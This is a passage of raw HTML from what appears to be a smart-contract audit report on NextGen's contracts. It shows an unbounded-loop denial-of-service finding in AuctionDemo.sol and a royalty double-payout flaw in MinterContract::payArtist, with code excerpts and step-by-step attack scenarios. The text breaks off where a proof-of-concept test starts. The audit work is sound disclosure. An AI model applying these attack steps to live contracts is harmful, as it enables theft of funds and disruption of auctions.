loop permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[H-05] Permanent DoS due to non-shrinking array usage in an unbounded loop</h2>\n<p><em>Submitted by <a href=\"https://gist.github.com/code423n4/b979a00ee3ea3f7d36ee39e2a536ba8a#h-01-permanent-dos-due-to-non-shrinking-array-usage-in-an-unbounded-loop\">Hound</a></em></p>\n<p><em>Note: this finding was reported via the winning <a href=\"https://gist.github.com/code423n4/b979a00ee3ea3f7d36ee39e2a536ba8a\">Automated Findings report</a>. It was declared out of scope for the audit, but is being included here for completeness.</em></p>\n<p>There are some arrays that can grow indefinitely in size, as they never shrink. When these arrays are used in unbounded loops, they may lead to a permanent denial-of-service (DoS) of these functions.</p>\n<h3 id=\"poc-1\" style=\"position:relative;\"><a href=\"#poc-1\" aria-label=\"poc 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>POC</h3>\n<ol>\n<li>Attacker calls <code>participateToAuction</code> N times with dust amounts until <code>returnHighestBid</code> reverts (out of gas).</li>\n<li>When <code>claimAuction</code> is called by <code>WinnerOrAdminRequired</code>, the transaction will fail, as it calls <code>returnHighestBid</code>. As a result, <code>claimAuction</code> will be permanently DoS.</li>\n</ol>\n<p><em>There are 4 instances of this issue:</em></p>\n<p>[<a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/08a56bacd286ee52433670f3bb73a0e4a4525dd4/smart-contracts/AuctionDemo.sol#L69\">69</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/08a56bacd286ee52433670f3bb73a0e4a4525dd4/smart-contracts/AuctionDemo.sol#L90\">90</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/08a56bacd286ee52433670f3bb73a0e4a4525dd4/smart-contracts/AuctionDemo.sol#L110\">110</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/08a56bacd286ee52433670f3bb73a0e4a4525dd4/smart-contracts/AuctionDemo.sol#L136\">136</a>]</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"10\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">smart</span><span class=\"mtk1\">-</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">AuctionDemo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// @audit function returnHighestBid is vulnerable as length grows in size but never shrinks</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">69</span><span class=\"mtk1\">: \t\t            </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">=</span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">&lt; </span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">].</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">60</span><span class=\"mtk1\">: \t\t        </span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">].</span><span class=\"mtk11\">push</span><span class=\"mtk1\">(</span><span class=\"mtk12\">newBid</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// @audit function returnHighestBidder is vulnerable as length grows in size but never shrinks</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">90</span><span class=\"mtk1\">: \t\t        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">=</span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">&lt; </span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">].</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">60</span><span class=\"mtk1\">: \t\t        </span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">].</span><span class=\"mtk11\">push</span><span class=\"mtk1\">(</span><span class=\"mtk12\">newBid</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// @audit function claimAuction is vulnerable as length grows in size but never shrinks</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">110</span><span class=\"mtk1\">: \t\t        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">=</span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">&lt; </span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">].</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> ++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">60</span><span class=\"mtk1\">: \t\t        </span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">].</span><span class=\"mtk11\">push</span><span class=\"mtk1\">(</span><span class=\"mtk12\">newBid</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// @audit function cancelAllBids is vulnerable as length grows in size but never shrinks</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">136</span><span class=\"mtk1\">: \t\t        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\">=</span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">&lt;</span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">].</span><span class=\"mtk12\">length</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">60</span><span class=\"mtk1\">: \t\t        </span><span class=\"mtk12\">auctionInfoData</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_tokenid</span><span class=\"mtk1\">].</span><span class=\"mtk11\">push</span><span class=\"mtk1\">(</span><span class=\"mtk12\">newBid</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p><strong><a href=\"https://gist.github.com/code423n4/b979a00ee3ea3f7d36ee39e2a536ba8a?permalink_comment_id=4797585#gistcomment-4797585\">a2rocket (NextGen) confirmed</a></strong></p>\n<p><strong><a href=\"https://gist.github.com/code423n4/b979a00ee3ea3f7d36ee39e2a536ba8a?permalink_comment_id=4797627#gistcomment-4797627\">0xsomeone (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Important and valid.</p>\n</blockquote>\n<hr>\n<h1 id=\"medium-risk-findings-12\" style=\"position:relative;\"><a href=\"#medium-risk-findings-12\" aria-label=\"medium risk findings 12 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Medium Risk Findings (12)</h1>\n<h2 id=\"m-01-mintercontractpayartist-can-result-in-double-the-intended-payout\" style=\"position:relative;\"><a href=\"#m-01-mintercontractpayartist-can-result-in-double-the-intended-payout\" aria-label=\"m 01 mintercontractpayartist can result in double the intended payout permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1686\">[M-01] <code>MinterContract::payArtist</code> can result in double the intended payout</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1686\">immeas</a>, also found by <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1550\">btk</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/1419\">dy</a>, <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/606\">7siech</a>, and <a href=\"https://github.com/code-423n4/2023-10-nextgen-findings/issues/325\">Myd</a></em></p>\n<p>The royalty allocation within the protocol works like this:</p>\n<p>First, an admin sets the split between team and artist. Here it is validated that the artist and team allocations together fill up 100%:</p>\n<p><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L369-L376\"><code>MinterContract::setPrimaryAndSecondarySplits</code></a>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"11\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">smart</span><span class=\"mtk1\">-</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">MinterContract</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">369</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setPrimaryAndSecondarySplits</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_collectionID</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_artistPrSplit</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_teamPrSplit</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_artistSecSplit</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_teamSecSplit</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">FunctionAdminRequired</span><span class=\"mtk1\">(this.setPrimaryAndSecondarySplits.selector) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">370</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_artistPrSplit</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">_teamPrSplit</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">100</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;splits need to be 100%&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">371</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_artistSecSplit</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">_teamSecSplit</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">100</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;splits need to be 100%&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">372</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">collectionRoyaltiesPrimarySplits</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionID</span><span class=\"mtk1\">].</span><span class=\"mtk12\">artistPercentage</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_artistPrSplit</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">373</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">collectionRoyaltiesPrimarySplits</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionID</span><span class=\"mtk1\">].</span><span class=\"mtk12\">teamPercentage</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_teamPrSplit</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">374</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">collectionRoyaltiesSecondarySplits</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionID</span><span class=\"mtk1\">].</span><span class=\"mtk12\">artistPercentage</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_artistSecSplit</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">375</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">collectionRoyaltiesSecondarySplits</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionID</span><span class=\"mtk1\">].</span><span class=\"mtk12\">teamPercentage</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_teamSecSplit</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">376</span><span class=\"mtk1\">:    }</span></span></span></code></pre>\n<p>The artist can then propose a split between artist addresses, where it is validated that the different artist addresses together add up to the total artist allocation:</p>\n<p><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L380-L382\"><code>MinterContract::proposePrimaryAddressesAndPercentages</code></a>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"12\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">smart</span><span class=\"mtk1\">-</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">MinterContract</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">380</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">proposePrimaryAddressesAndPercentages</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_collectionID</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_primaryAdd1</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_primaryAdd2</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_primaryAdd3</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_add1Percentage</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_add2Percentage</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_add3Percentage</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">ArtistOrAdminRequired</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_collectionID</span><span class=\"mtk1\">, this.proposePrimaryAddressesAndPercentages.selector) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">381</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">collectionArtistPrimaryAddresses</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionID</span><span class=\"mtk1\">].</span><span class=\"mtk12\">status</span><span class=\"mtk1\"> == </span><span class=\"mtk4\">false</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Already approved&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">382</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">_add1Percentage</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">_add2Percentage</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">_add3Percentage</span><span class=\"mtk1\"> == </span><span class=\"mtk12\">collectionRoyaltiesPrimarySplits</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionID</span><span class=\"mtk1\">].</span><span class=\"mtk12\">artistPercentage</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Check %&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>Then, also when paid out, there is a validation that the split between team and artist allocation adds up:</p>\n<p><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L415-L418\"><code>MinterContract::payArtist</code></a>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"13\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">smart</span><span class=\"mtk1\">-</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">MinterContract</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">415</span><span class=\"mtk1\">:    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payArtist</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_collectionID</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_team1</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_team2</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_teamperc1</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_teamperc2</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">FunctionAdminRequired</span><span class=\"mtk1\">(this.payArtist.selector) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">416</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collectionArtistPrimaryAddresses</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionID</span><span class=\"mtk1\">].</span><span class=\"mtk12\">status</span><span class=\"mtk1\"> == </span><span class=\"mtk4\">true</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Accept Royalties&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">417</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collectionTotalAmount</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionID</span><span class=\"mtk1\">] &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Collection Balance must be greater than 0&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">418</span><span class=\"mtk1\">:        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">collectionRoyaltiesPrimarySplits</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_collectionID</span><span class=\"mtk1\">].</span><span class=\"mtk12\">artistPercentage</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">_teamperc1</span><span class=\"mtk1\"> + </span><span class=\"mtk12\">_teamperc2</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">100</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Change percentages&quot;</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>The issue is that here, it compares to the artist allocation from artist/team allocations. When the actual amount paid out is calculated, it uses the proposed (and accepted) artist address percentages:</p>\n<p><a href=\"https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L429-L431\"><code>MinterContract::payArtist</code></a>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"14\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">smart</span><span class=\"mtk1\">-</span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">MinterContract</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">429</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">artistRoyalties1</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">royalties</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">collectionArtistPrimaryAddresses</span><span class=\"mtk1\">[</span><span class=\"mtk12\">colId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">add1Percentage</span><span class=\"mtk1\"> / </span><span class=\"mtk7\">100</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">430</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">artistRoyalties2</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">royalties</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">collectionArtistPrimaryAddresses</span><span class=\"mtk1\">[</span><span class=\"mtk12\">colId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">add2Percentage</span><span class=\"mtk1\"> / </span><span class=\"mtk7\">100</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">431</span><span class=\"mtk1\">:        </span><span class=\"mtk12\">artistRoyalties3</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">royalties</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">collectionArtistPrimaryAddresses</span><span class=\"mtk1\">[</span><span class=\"mtk12\">colId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">add3Percentage</span><span class=\"mtk1\"> / </span><span class=\"mtk7\">100</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>Hence, there is a possibility that up to double the intended amount can be paid out, imagine this scenario:</p>\n<ol>\n<li>An admin sets artist/team allocation to 100% artist, 0% team.</li>\n<li>Artist proposes a split between addresses (for the total 100%), which is accepted.</li>\n<li>Admin then changes the allocation to 0% artist, 100% team.</li>\n</ol>\n<p>They then call <code>payArtist</code> with the 100% team allocation. This will pass the check as <code>artistPercentage</code> will be <code>0</code>. However, the artist payouts will use the already proposed artist address allocations. Hence, double the amount will be paid out.</p>\n<h3 id=\"impact-2\" style=\"position:relative;\"><a href=\"#impact-2\" aria-label=\"impact 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>An admin can maliciously, or by mistake, manipulate the percentage allocation for a collections royalty to pay out up to double the amount of royalty. This could make it impossible to payout royalty later, as this steals royalty from other collections.</p>\n<h3 id=\"proof-of-concept-4\" style=\"position:relative;\"><a href=\"#proof-of-concept-4\" aria-label=\"proof of concept 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>PoC using foundry. Save file in <code>hardhat/test/MinterContractTest.t.sol</code>, also needs <code>forge-std</code> in <code>hardhat/lib</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"15\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span 